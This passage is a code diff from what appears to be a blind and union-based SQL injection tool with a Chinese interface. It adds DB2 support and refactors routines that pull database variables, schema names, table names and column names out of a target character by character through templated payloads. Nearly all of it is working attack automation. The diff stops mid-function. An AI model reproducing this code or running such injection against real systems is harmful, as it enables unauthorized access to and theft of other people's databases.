@@ -230,7 +230,7 @@ namespace SuperSQLInjection
             return sid;
         }
 
-        public static int version = 20181228;
+        public static int version = 20190102;
         public static string versionURL = "http://www.shack2.org/soft/getNewVersion?ENNAME=SSuperSQLInjection&NO=" + URLEncode.UrlEncode(getSid()) + "&VERSION=" + version;
         //检查更新
         public void checkUpdate()
@@ -362,12 +362,26 @@ namespace SuperSQLInjection
                 MessageBox.Show("盲注需要设置判断值，这个判断值呢，就是正常时（and 1=1）存在的情况，而不正常时（and 1=2）不存在的情况！");
                 return false;
             }
-
-            if (InjectType.Union.Equals(config.injectType)&& (this.txt_inject_unionColumnsCount.Text.Length <= 0 || this.txt_inject_showColumn.Text.Length <= 0))
-            {
-                MessageBox.Show("Union注入需要设置查询总列数和数据显示列！");
-                return false;
+            if (InjectType.Union.Equals(config.injectType)) {
+                if (DBType.DB2.Equals(config.dbType))
+                {
+                    if (this.txt_inject_unionTemplate.Text.Length<=0)
+                    {
+                        MessageBox.Show("DB2 Union注入，需要设置填充模板，填充方法，请参考使用说明书！");
+                        this.txt_inject_unionTemplate.Focus();
+                        return false;
+                    }
+                }
+                else {
+                    if (this.txt_inject_unionColumnsCount.Text.Length <= 0 || this.txt_inject_showIndex.Text.Length <= 0)
+                    {
+                        MessageBox.Show("Union注入需要设置查询总列数和数据显示列！");
+                        this.txt_inject_unionColumnsCount.Focus();
+                        return false;
+                    }
+                }
             }
+            
 
             config.key = this.txt_inject_key.Text;
 
@@ -545,7 +559,7 @@ namespace SuperSQLInjection
         }
 
 
-        public void getVariablesByUnionByMySQL5(Object v)
+        public void getVariablesByUnionByMySQL(Object v)
         {
             if (status == 0)
             {
@@ -593,8 +607,17 @@ namespace SuperSQLInjection
             this.Invoke(new setVariableDelegate(setVariable), sv[0], result);
             Interlocked.Increment(ref this.currentDataCount);
         }
+        public void getVariablesByUnionByDB2(Object v)
+        {
 
-        public void getVariablesByErrorByMySQL5(Object v)
+            String[] sv = v.ToString().Split(':');
+            String pay_load = DB2.getUnionDataValue(config.unionFillTemplate, sv[1], "", "", "");
+            String result = getOneDataByUnionOrError(pay_load);
+            this.Invoke(new setVariableDelegate(setVariable), sv[0], result);
+            Interlocked.Increment(ref this.currentDataCount);
+        }
+
+        public void getVariablesByErrorByMySQL(Object v)
         {
             String[] sv = v.ToString().Split(':');
             List<String> column_list = new List<String>();
@@ -659,180 +682,98 @@ namespace SuperSQLInjection
 
         public void getVariablesByUnion(DBType dbType)
         {
-            switch (dbType)
+            this.dataCount = this.data_lvw_ver.CheckedItems.Count;
+            if (this.data_lvw_ver.CheckedItems.Count > 0)
             {
-
-                case DBType.Access:
-                    MessageBox.Show("报告大侠，Access数据库不支持此功能！");
-                    break;
-                case DBType.MySQL:
-                    this.dataCount = MySQL.vers.Count;
-                    if (MySQL.vers != null && MySQL.vers.Count > 0)
+                for (int j = 0; j < this.data_lvw_ver.CheckedItems.Count; j++)
+                {
+                    String v = this.data_lvw_ver.CheckedItems[j].SubItems[0].Text + ":" + this.data_lvw_ver.CheckedItems[j].Tag;
+                    switch (dbType)
                     {
-                        for (int j = 0; j < MySQL.vers.Count; j++)
-                        {
-                            String v = MySQL.vers[j];
-                            //获取对应环境变量值
-                            stp.QueueWorkItem<String>(getVariablesByUnionByMySQL5, v);
-                        }
-                        stp.WaitForIdle();
-
-                    }
-                    else
-                    {
-                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/mysql5/vers.txt是否存在！");
-                    }
-                    break;
-                case DBType.SQLServer:
-                    this.dataCount = SQLServer.vers.Count;
-                    if (SQLServer.vers != null && SQLServer.vers.Count > 0)
-                    {
-                        for (int j = 0; j < SQLServer.vers.Count; j++)
-                        {
-                            String v = SQLServer.vers[j];
-                            //获取对应环境变量值
+                        case DBType.Access:
+                            MessageBox.Show("报告大侠，Access数据库不支持此功能！");
+                            break;
+                        case DBType.MySQL:
+                            stp.QueueWorkItem<String>(getVariablesByUnionByMySQL, v);
+                            break;
+                        case DBType.SQLServer:
                             stp.QueueWorkItem<String>(getVariablesByUnionBySQLServer, v);
-                        }
-                        stp.WaitForIdle();
-                    }
-                    else
-                    {
-                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/sqlserver/vers.txt是否存在！");
-                    }
-                    break;
-                case DBType.Oracle:
-                    this.dataCount = Oracle.vers.Count;
-                    if (Oracle.vers != null && Oracle.vers.Count > 0)
-                    {
-                        for (int j = 0; j < Oracle.vers.Count; j++)
-                        {
-                            String v = Oracle.vers[j];
-                            //获取对应环境变量值
+                            break;
+                        case DBType.Oracle:
                             stp.QueueWorkItem<String>(getVariablesByUnionByOracle, v);
-                        }
-                        stp.WaitForIdle();
-                    }
-                    else
-                    {
-                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/sqlserver/vers.txt是否存在！");
-                    }
-                    break;
-                case DBType.PostgreSQL:
-                    this.dataCount = PostgreSQL.vers.Count;
-                    if (PostgreSQL.vers != null && PostgreSQL.vers.Count > 0)
-                    {
-                        for (int j = 0; j < PostgreSQL.vers.Count; j++)
-                        {
-                            String v = PostgreSQL.vers[j];
-                            //获取对应环境变量值
+                            break;
+                        case DBType.PostgreSQL:
                             stp.QueueWorkItem<String>(getVariablesByUnionByPostgreSQL, v);
-                        }
-                        stp.WaitForIdle();
+                            break;
+                        case DBType.DB2:
+                            stp.QueueWorkItem<String>(getVariablesByUnionByDB2, v);
+                            break;
                     }
-                    else
-                    {
-                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/vers/postgresql.txt是否存在！");
-                    }
-                    break;
+                }
+                stp.WaitForIdle();
             }
+            else {
+                MessageBox.Show("请选择要获取的环境变量！");
+            }
+
+
+            
 
         }
         public void getVariablesByError(DBType dbType)
         {
-            switch (dbType)
+            this.dataCount = this.data_lvw_ver.CheckedItems.Count;
+            if (this.data_lvw_ver.CheckedItems.Count > 0)
             {
-
-                case DBType.Access:
-                    MessageBox.Show("抱歉，Access数据库不支持错误显示方式注入！");
-                    break;
-                case DBType.MySQL:
-                    this.dataCount = MySQL.vers.Count;
-                    if (MySQL.vers != null && MySQL.vers.Count > 0)
+                for (int j = 0; j < this.data_lvw_ver.CheckedItems.Count; j++)
+                {
+                    String v = this.data_lvw_ver.CheckedItems[j].SubItems[0].Text + ":" + this.data_lvw_ver.CheckedItems[j].Tag;
+                    switch (dbType)
                     {
-                        for (int j = 0; j < MySQL.vers.Count; j++)
-                        {
-                            String v = MySQL.vers[j];
-                            //获取对应环境变量值
-                            stp.QueueWorkItem<String>(getVariablesByErrorByMySQL5, v);
-                        }
-                        stp.WaitForIdle();
-                    }
-                    else
-                    {
-                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/mysql5/vers.txt是否存在！");
-                    }
-                    break;
-                case DBType.SQLServer:
-                    this.dataCount = SQLServer.vers.Count;
-                    if (SQLServer.vers != null && SQLServer.vers.Count > 0)
-                    {
-                        for (int j = 0; j < SQLServer.vers.Count; j++)
-                        {
-                            String v = SQLServer.vers[j];
-                            //获取对应环境变量值
+                        case DBType.Access:
+                            MessageBox.Show("抱歉，Access数据库不支持错误显示方式注入！");
+                            break;
+                        case DBType.MySQL:
+                            stp.QueueWorkItem<String>(getVariablesByErrorByMySQL, v);
+                            break;
+                        case DBType.SQLServer:
                             stp.QueueWorkItem<String>(getVariablesByErrorBySQLServer, v);
-                        }
-                        stp.WaitForIdle();
-                    }
-                    else
-                    {
-                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/sqlserver/vers.txt是否存在！");
-                    }
-                    break;
-                case DBType.Oracle:
-                    this.dataCount = Oracle.vers.Count;
-                    if (Oracle.vers != null && Oracle.vers.Count > 0)
-                    {
-                        for (int j = 0; j < Oracle.vers.Count; j++)
-                        {
-                            String v = Oracle.vers[j];
-                            //获取对应环境变量值
+                            break;
+                        case DBType.Oracle:
                             stp.QueueWorkItem<String>(getVariablesByErrorByOracle, v);
-                        }
-                        stp.WaitForIdle();
-                    }
-                    else
-                    {
-                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/vers/sqlserver.txt是否存在！");
-                    }
-                    break;
-                case DBType.PostgreSQL:
-                    this.dataCount = PostgreSQL.vers.Count;
-                    if (PostgreSQL.vers != null && PostgreSQL.vers.Count > 0)
-                    {
-                        for (int j = 0; j < PostgreSQL.vers.Count; j++)
-                        {
-                            String v = PostgreSQL.vers[j];
-                            //获取对应环境变量值
+                            break;
+                        case DBType.PostgreSQL:
                             stp.QueueWorkItem<String>(getVariablesByErrorByPostgreSQL, v);
-                        }
-                        stp.WaitForIdle();
+                            break;
+                        case DBType.DB2:
+                            MessageBox.Show("抱歉DB2数据库暂不支持显错方式获取数据！");
+                            break;
                     }
-                    else
-                    {
-                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/vers/postgresql.txt是否存在！");
-                    }
-                    break;
+                }
+                stp.WaitForIdle();
             }
+            else
+            {
+                MessageBox.Show("请选择要获取的环境变量！");
+            }
+           
 
         }
 
         public void getVariablesByBool(DBType dbType)
         {
-
-            switch (dbType)
+            this.dataCount = this.data_lvw_ver.CheckedItems.Count;
+            if (this.data_lvw_ver.CheckedItems.Count > 0)
             {
-
-                case DBType.Access:
-                    MessageBox.Show("报告大侠，Access数据库不支持此功能！");
-                    break;
-                case DBType.MySQL:
-                    this.dataCount = MySQL.vers.Count;
-                    if (MySQL.vers != null && MySQL.vers.Count > 0)
+                for (int j = 0; j < this.data_lvw_ver.CheckedItems.Count; j++)
+                {
+                    String v = this.data_lvw_ver.CheckedItems[j].SubItems[0].Text + ":" + this.data_lvw_ver.CheckedItems[j].Tag;
+                    switch (dbType)
                     {
-                        for (int j = 0; j < MySQL.vers.Count; j++)
-                        {
-                            String v = MySQL.vers[j];
+                        case DBType.Access:
+                            MessageBox.Show("报告大侠，Access数据库不支持此功能！");
+                            break;
+                        case DBType.MySQL:
                             //获取对应环境变量值
                             if (config.keyType.Equals(KeyType.Time))
                             {
@@ -842,22 +783,8 @@ namespace SuperSQLInjection
                             {
                                 stp.QueueWorkItem<String>(getVariableByBoolByMySQL, v);
                             }
-
-                        }
-                        stp.WaitForIdle();
-                    }
-                    else
-                    {
-                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/mysql5/vers.txt是否存在！");
-                    }
-                    break;
-                case DBType.SQLServer:
-                    this.dataCount = SQLServer.vers.Count;
-                    if (SQLServer.vers != null && SQLServer.vers.Count > 0)
-                    {
-                        for (int j = 0; j < SQLServer.vers.Count; j++)
-                        {
-                            String v = SQLServer.vers[j];
+                            break;
+                        case DBType.SQLServer:
                             //获取对应环境变量值
                             if (config.keyType.Equals(KeyType.Time))
                             {
@@ -867,39 +794,11 @@ namespace SuperSQLInjection
                             {
                                 stp.QueueWorkItem<String>(getVariableByBoolBySQLServer, v);
                             }
-                        }
-                        stp.WaitForIdle();
-                    }
-                    else
-                    {
-                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/sqlserver/vers.txt是否存在！");
-                    }
-                    break;
-                case DBType.Oracle:
-                    this.dataCount = Oracle.vers.Count;
-                    if (Oracle.vers != null && Oracle.vers.Count > 0)
-                    {
-                        for (int j = 0; j < Oracle.vers.Count; j++)
-                        {
-                            String v = Oracle.vers[j];
-                            stp.QueueWorkItem<String>(getVariableByBoolByOracle, v);
-                        }
-                        stp.WaitForIdle();
-                    }
-                    else
-                    {
-                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/sqlserver/vers.txt是否存在！");
-                    }
-
-                    break;
-                case DBType.PostgreSQL:
-                    this.dataCount = PostgreSQL.vers.Count;
-                    if (PostgreSQL.vers != null && PostgreSQL.vers.Count > 0)
-                    {
-                        for (int j = 0; j < PostgreSQL.vers.Count; j++)
-                        {
-                            String v = PostgreSQL.vers[j];
-                            //获取对应环境变量值
+                            break;
+                        case DBType.Oracle:
+                            stp.QueueWorkItem<String>(getVariableByBoolByOracle, v);           
+                            break;
+                        case DBType.PostgreSQL:
                             if (config.keyType.Equals(KeyType.Time))
                             {
                                 stp.QueueWorkItem<String>(getVariableByBoolByPostgreSQLSleep, v);
@@ -909,15 +808,19 @@ namespace SuperSQLInjection
                                 stp.QueueWorkItem<String>(getVariableByBoolByPostgreSQL, v);
                             }
 
-                        }
-                        stp.WaitForIdle();
+                            break;
+                        case DBType.DB2:
+                            stp.QueueWorkItem<String>(getVariableByBoolByDB2, v);
+                            break;
                     }
-                    else
-                    {
-                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/mysql5/vers.txt是否存在！");
-                    }
-                    break;
+                }
+                stp.WaitForIdle();
             }
+            else {
+                MessageBox.Show("请选择要获取的环境变量！");
+            }
+
+            
         }
 
         /**
@@ -925,8 +828,6 @@ namespace SuperSQLInjection
          */
         public void getVers()
         {
-            //获取环境变量
-            this.data_lvw_ver.Items.Clear();
             //检查注入配置
             if (checkConfig())
             {
@@ -939,7 +840,6 @@ namespace SuperSQLInjection
                         case InjectType.Bool:
                             getVariablesByBool(config.dbType);
                             break;
-
                         case InjectType.Union:
                             getVariablesByUnion(config.dbType);
                             break;
@@ -973,10 +873,16 @@ namespace SuperSQLInjection
         public delegate void setVariableDelegate(String name, String value);
         public void setVariable(String name, String value)
         {
-            ListViewItem lvi = new ListViewItem(name);
-
-            lvi.SubItems.Add(value);
-            this.data_lvw_ver.Items.Add(lvi);
+            ListViewItem lvi= this.data_lvw_ver.FindItemWithText(name);
+            if (lvi.SubItems.Count<=1)
+            {
+                lvi.SubItems.Add(value);
+            }
+            else {
+                lvi.SubItems[1].Text = value;
+            }
+            
+           
         }
 
         /// <summary>
@@ -999,9 +905,10 @@ namespace SuperSQLInjection
                     String tmp_va_payload = va_payload.Replace("{index}", i + "");
                     int ascii = getValue(tmp_va_payload, 32, 126);
                     value += ((char)ascii).ToString();
+                    this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
                 }
                 this.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);
-                this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
+                
 
             }
             catch (Exception e)
@@ -1030,9 +937,10 @@ namespace SuperSQLInjection
                     String tmp_va_payload = va_payload.Replace("{index}", i + "");
                     int ascii = getValue(tmp_va_payload, 32, 126);
                     value += ((char)ascii).ToString();
+                    this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
                 }
                 this.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);
-                this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
+                
 
             }
             catch (Exception e)
@@ -1062,9 +970,10 @@ namespace SuperSQLInjection
                     String tmp_va_payload = va_payload.Replace("{index}", i + "");
                     int ascii = getValue(tmp_va_payload, 32, 126);
                     value += ((char)ascii).ToString();
+                    this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
                 }
                 this.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);
-                this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
+                
 
             }
             catch (Exception e)
@@ -1096,9 +1005,10 @@ namespace SuperSQLInjection
                     String tmp_va_payload = va_payload.Replace("{index}", i + "");
                     int ascii = getValue(tmp_va_payload, 32, 126);
                     value += ((char)ascii).ToString();
+                    this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
                 }
                 this.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);
-                this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
+               
 
             }
             catch (Exception e)
@@ -1131,12 +1041,13 @@ namespace SuperSQLInjection
                     //取值payload，替换对应下标值
                     String unicode_data_payload = SQLServer.nocast_unicode_value.Replace("{index}", i + "").Replace("{data}", vs[1] + "");
                     int unicode = getValue(SQLServer.getBoolDataBySleep(SQLServer.bool_value.Replace("{data}", unicode_data_payload), config.maxTime), 32, 126);
-
-                    value += Tools.unHexByUnicode(unicode, config.db_encoding);
                     //设置值,这里由于是unicode值，需要转换 
+                    value += Tools.unHexByUnicode(unicode, config.db_encoding);
+                    this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
+                 
                 }
                 this.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value,LogLevel.info);
-                this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
+              
 
             }
             catch (Exception e)
@@ -1166,13 +1077,15 @@ namespace SuperSQLInjection
                     //取值payload，替换对应下标值
                     String unicode_data_payload = SQLServer.nocast_unicode_value.Replace("{index}", i + "").Replace("{data}", vs[1] + "");
                     int unicode = getValue(SQLServer.bool_value.Replace("{data}", unicode_data_payload), 32, 126);
-
-                    value += Tools.unHexByUnicode(unicode, config.db_encoding);
+                    
                     //设置值,这里由于是unicode值，需要转换 
+                    value += Tools.unHexByUnicode(unicode, config.db_encoding);
+                    
+                    this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
                 }
 
                 this.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);
-                this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
+                
 
             }
             catch (Exception e)
@@ -1204,9 +1117,45 @@ namespace SuperSQLInjection
                     String dp = va_payload.Replace("{index}", i.ToString());
                     int ascii = getValue(dp, 32, 126);
                     value += (char)ascii;
+                    this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
                 }
                 this.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);
-                this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
+               
+
+            }
+            catch (Exception e)
+            {
+
+                this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+            }
+            Interlocked.Increment(ref this.currentDataCount);
+        }
+
+        /// <summary>
+        /// 获取环境变量oracle bool
+        /// </summary>
+        /// <param name="vers"></param>
+        public void getVariableByBoolByDB2(Object vers)
+        {
+            try
+            {
+                String[] vs = vers.ToString().Split(':');
+                //判断变量长度
+                int len = getValueByStepUp(DB2.bool_length.Replace("{data}", vs[1]), 0, 10);
+                this.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
+
+                String va_payload = DB2.bool_value.Replace("{data}", vs[1]);
+                String value = "";
+                //获取值
+                for (int i = 1; i <= len; i++)
+                {
+                    String dp = va_payload.Replace("{index}", i.ToString());
+                    int ascii = getValue(dp, 32, 126);
+                    value += (char)ascii;
+                    this.Invoke(new setVariableDelegate(setVariable), vs[0], value);
+                }
+                this.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);
+                
 
             }
             catch (Exception e)
@@ -1484,8 +1433,8 @@ namespace SuperSQLInjection
                 String payload_len = Oracle.bool_length.Replace("{data}", Oracle.db_value.Replace("{index}", oindex.ToString()));
 
                 //判断当前数据库长度限制1-50
-                int len = getValue(payload_len, 1, 50);
-                this.Invoke(new showLogDelegate(log), "数据库" + (db_index + 1) + "长度为：" + len,LogLevel.info);
+                int len = getValue(payload_len,1, 50);
+                this.Invoke(new showLogDelegate(log), "数据库" + (db_index) + "长度为：" + len,LogLevel.info);
 
                 //判断当前数据库对应的ascii码
                 String va_payload = Oracle.bool_value.Replace("{data}", Oracle.db_value.Replace("{index}", oindex.ToString()));
@@ -1503,6 +1452,49 @@ namespace SuperSQLInjection
                     value += ((char)ascii).ToString();
                 }
                 this.Invoke(new showLogDelegate(log), "数据库" + db_index + "的名称为：" + value,LogLevel.info);
+                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), value);
+
+            }
+            catch (Exception e)
+            {
+
+                this.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
+            }
+            Interlocked.Increment(ref this.currentDbsCount);
+        }
+
+        /// <summary>
+        /// 获取数据库名称
+        /// </summary>
+        /// <param name="oindex">下标limit</param>
+        public void getDBNameByBoolByDB2(Object oindex)
+        {
+            try
+            {
+                int db_index = int.Parse(oindex.ToString());
+                //判断对应下标的数据库长度
+                String payload_len = DB2.bool_length.Replace("{data}", DB2.db_value.Replace("{index}", oindex.ToString()));
+
+                //判断当前数据库长度限制1-50
+                int len = getValue(payload_len, 1, 50);
+                this.Invoke(new showLogDelegate(log), "数据库表模式" + (db_index) + "长度为：" + len, LogLevel.info);
+
+                //判断当前数据库对应的ascii码
+                String va_payload = DB2.bool_value.Replace("{data}", DB2.db_value.Replace("{index}", oindex.ToString()));
+                String value = "";
+                //获取值
+                for (int i = 1; i <= len; i++)
+                {
+                    if (status != 1)
+                    {
+                        break;
+                    }
+                    //取值payload，替换对应下标值
+                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
+                    int ascii = getValue(tmp_va_payload, 32, 126);
+                    value += ((char)ascii).ToString();
+                }
+                this.Invoke(new showLogDelegate(log), "数据库" + db_index + "的名称为：" + value, LogLevel.info);
                 this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), value);
 
             }
@@ -1571,6 +1563,27 @@ namespace SuperSQLInjection
                 //获取数据库数量
                 String result = getOneDataByUnionOrError(Oracle.getUnionDataValue(config.columnsCount, config.showColumn, Oracle.db_value, "", "", oindex.ToString()));
                 this.Invoke(new showLogDelegate(log), "数据库" + oindex + "的名称为：" + result, LogLevel.info);
+                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
+            }
+            catch (Exception e)
+            {
+
+                this.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
+            }
+            Interlocked.Increment(ref this.currentDbsCount);
+        }
+
+        /// <summary>
+        /// 获取数据库名称Union方式DB2
+        /// </summary>
+        /// <param name="oindex">下标limit</param>
+        public void getDBNameByUnionByDB2(Object oindex)
+        {
+            try
+            {
+                //获取数据库数量
+                String result = getOneDataByUnionOrError(DB2.getUnionDataValue(config.unionFillTemplate, DB2.db_value, "", "", oindex.ToString()));
+                this.Invoke(new showLogDelegate(log), "数据库表模式" + oindex + "的名称为：" + result, LogLevel.info);
                 this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
             }
             catch (Exception e)
@@ -1836,6 +1849,44 @@ namespace SuperSQLInjection
             Interlocked.Increment(ref this.currentTableCount);
         }
 
+        /// <summary>
+        /// bool方式获取DB2表
+        /// </summary>
+        /// <param name="osn"></param>
+        public void getTableNameValueByBoolByDB2(Object osn)
+        {
+            try
+            {
+                SelectNode sn = (SelectNode)osn;
+                int selectIndex = sn.tn.Index;
+                //判断当前表长度
+                String data_payload = DB2.table_value.Replace("{dbname}", sn.dbname).Replace("{index}", sn.limit + "");
+                int len = getValue(DB2.bool_length.Replace("{data}", data_payload), 1, 50);
+
+                //判断当前数据库对应的ascii码
+                String va_payload = DB2.bool_value.Replace("{data}", data_payload);
+                String value = "";
+                //获取值
+                for (int i = 1; i <= len; i++)
+                {
+                    //取值payload，替换对应下标值
+                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
+                    int ascii = getValue(tmp_va_payload, 0, 128);
+                    value += ((char)ascii).ToString();
+                }
+                this.Invoke(new showLogDelegate(log), "数据库" + sn.dbname + "发现表：" + value, LogLevel.info);
+                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, value, "table");
+
+            }
+            catch (Exception e)
+            {
+
+                this.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+            }
+            Interlocked.Increment(ref this.currentTableCount);
+        }
+
+
 
         public void getTableNameValueByBoolBySQLServerSleep(Object osn)
         {
@@ -1988,6 +2039,24 @@ namespace SuperSQLInjection
             this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
             Interlocked.Increment(ref this.currentTableCount);
         }
+
+
+        /// <summary>
+        /// 获取表名，多线程调用db2
+        /// </summary>
+        /// <param name="osn"></param>
+        public void getTableNameValueByUnionByDB2(Object osn)
+        {
+
+            SelectNode sn = (SelectNode)osn;
+            String tables_value_payload = DB2.getUnionDataValue(config.unionFillTemplate, DB2.table_value, sn.dbname, "", sn.limit.ToString());
+            String result = getOneDataByUnionOrError(tables_value_payload);
+
+            this.Invoke(new showLogDelegate(log), "数据库表模式" + sn.dbname + "发现表：" + result, LogLevel.info);
+            this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "table");
+            Interlocked.Increment(ref this.currentTableCount);
+        }
+
 
         /// <summary>
         /// 获取表名，多线程调用PostgreSQL
@@ -2238,6 +2307,7 @@ namespace SuperSQLInjection
         {
             ListViewItem lvi = new ListViewItem(index);
             lvi.Tag = index;
+            
             lvi.SubItems.Add(payload);
             lvi.SubItems.Add(server.runTime + "");
             lvi.SubItems.Add(server.code + "");
@@ -2479,6 +2549,9 @@ namespace SuperSQLInjection
                         MessageBox.Show("没有发现数据库，奇怪了！");
                     }
                     break;
+                case DBType.DB2:
+                    MessageBox.Show("抱歉DB2数据库暂不支持显错方式获取数据！");
+                    break;
             }
 
         }
@@ -2570,6 +2643,27 @@ namespace SuperSQLInjection
                         {
                             //获取对应的数据库
                             stp.QueueWorkItem<object>(getDBNameByUnionByPostgreSQL, j);
+                        }
+                        stp.WaitForIdle();
+                    }
+                    else
+                    {
+                        MessageBox.Show("没有发现数据库，奇怪了！");
+                    }
+                    break;
+                case DBType.DB2:
+                    //获取数据库数量
+                    result = getOneDataByUnionOrError(DB2.getUnionDataValue(config.unionFillTemplate, DB2.dbs_count, "", "", ""));
+
+                    this.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + result + "个数据库表模式！", LogLevel.info);
+                    db_len = Tools.convertToInt(result);
+                    this.dbsCount = db_len;
+                    if (db_len > 0)
+                    {
+                        for (int j = 1; j <= db_len; j++)
+                        {
+                            //获取对应的数据库
+                            stp.QueueWorkItem<object>(getDBNameByUnionByDB2, j);
                         }
                         stp.WaitForIdle();
                     }
@@ -2692,6 +2786,27 @@ namespace SuperSQLInjection
                         {
                             //获取对应的数据库
                             stp.QueueWorkItem<object>(getDBNameByBoolByPostgreSQL, j);
+                        }
+                        stp.WaitForIdle();
+
+                    }
+                    else
+                    {
+                        MessageBox.Show("没有发现数据库，奇怪了！");
+                    }
+                    break;
+
+                case DBType.DB2:
+                    db_len = getValueByStepUp(DB2.bool_db_count, 0, 10);
+                    this.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + db_len + "个数据库表模式！", LogLevel.info);
+                    this.dbsCount = db_len;
+                    if (db_len > 0)
+                    {
+                        //db下标从1开始
+                        for (int j = 1; j <= db_len; j++)
+                        {
+                            //获取对应的数据库
+                            stp.QueueWorkItem<object>(getDBNameByBoolByDB2, j);
                         }
                         stp.WaitForIdle();
 
@@ -2887,6 +3002,20 @@ namespace SuperSQLInjection
                     }
                     stp.WaitForIdle();
                     break;
+                case DBType.DB2:
+                    //获取当前数据库长度
+                    this.tableCount = getValueByStepUp(DB2.bool_tables_count.Replace("{dbname}", dbname), 0, 50);
+                    this.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbname + "发现" + this.tableCount + "个表！", LogLevel.info);
+                    for (int i = 1; i <= this.tableCount; i++)
+                    {
+                        SelectNode sn = new SelectNode();
+                        sn.tn = tn;
+                        sn.limit = i;
+                        sn.dbname = dbname;
+                        stp.QueueWorkItem<SelectNode>(getTableNameValueByBoolByDB2, sn);
+                    }
+                    stp.WaitForIdle();
+                    break;
             }
 
 
@@ -2983,6 +3112,24 @@ namespace SuperSQLInjection
                     }
                     stp.WaitForIdle();
                     break;
+                case DBType.DB2:
+                    //获取当前数据库表数量
+                    tables_count_payload = DB2.getUnionDataValue(config.unionFillTemplate, DB2.tables_count, dbName, "", "");
+                    result = getOneDataByUnionOrError(tables_count_payload);
+
+                    this.Invoke(new showLogDelegate(log), "报告大侠，数据库表模式" + dbName + "有" + Tools.convertToInt(result) + "个表！", LogLevel.info);
+                    this.tableCount = Tools.convertToInt(result);
+                    //下标1开始
+                    for (int i = 1; i <= this.tableCount; i++)
+                    {
+                        SelectNode sn = new SelectNode();
+                        sn.tn = tn;
+                        sn.limit = i;
+                        sn.dbname = dbName;
+                        stp.QueueWorkItem<SelectNode>(getTableNameValueByUnionByDB2, sn);
+                    }
+                    stp.WaitForIdle();
+                    break;
             }
         }
 
@@ -3074,6 +3221,9 @@ namespace SuperSQLInjection
                     }
                     stp.WaitForIdle();
                     break;
+                case DBType.DB2:
+                    MessageBox.Show("抱歉DB2数据库暂不支持显错方式获取数据！");
+                    break;
             }
         }
 
@@ -3105,9 +3255,9 @@ namespace SuperSQLInjection
             {
                 //获取环境变量
                 this.data_tvw_dbs.Nodes.Clear();
-                if (this.cbox_basic_dbType.Text.Equals("Access"))
+                if (DBType.Access.ToString().Equals(this.cbox_basic_dbType.Text))
                 {
-                    addDBToTreeList("Access");
+                    addDBToTreeList(DBType.Access.ToString());
                 }
                 //检查注入配置
                 if (checkConfig())
@@ -3423,6 +3573,42 @@ namespace SuperSQLInjection
         }
 
         /// <summary>
+        /// 获取列明称,bool方式
+        /// </summary>
+        /// <param name="osn">表的节点</param>
+        public void getColumnNameByBoolByDB2(Object osn)
+        {
+
+            try
+            {
+                SelectNode sn = (SelectNode)osn;
+                //判断当前表长度
+                String data_payload = DB2.column_value.Replace("{table}", sn.tableName).Replace("{index}", sn.limit + "").Replace("{dbname}", sn.dbname);
+                int len = getValue(DB2.bool_length.Replace("{data}", data_payload), 1, 50);
+
+                //判断当前数据库对应的ascii码
+                String va_payload = DB2.bool_value.Replace("{data}", data_payload);
+                String value = "";
+                //获取值
+                for (int i = 1; i <= len; i++)
+                {
+                    //取值payload，替换对应下标值
+                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
+                    int ascii = getValue(tmp_va_payload, 0, 128);
+                    value += ((char)ascii).ToString();
+                }
+                this.Invoke(new showLogDelegate(log), "表" + sn.tableName + "发现列：" + value, LogLevel.info);
